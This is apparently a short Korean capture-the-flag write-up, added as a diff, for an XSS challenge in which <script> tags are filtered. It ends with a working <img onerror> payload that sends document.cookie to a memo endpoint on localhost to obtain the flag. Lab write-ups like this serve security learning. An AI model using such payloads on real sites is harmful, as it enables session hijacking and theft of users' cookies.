@@ -1,0 +1,7 @@
+Analysis)
+- vuln(xss) page - GET 방식으로 파라미터 값을 받아 return ( <script>구문 삽입을 통한 xss )
+                   xss-1과 달리 <script>구문 사용 불가
+
+Exploit) 
+- <script> 구문이 아닌 다른 xxs취약점 우회 방법을 사용 해 flag 획득
+   => <img src=x onerror=location.href="http://localhost:8000/memo?memo="+document.cookie>
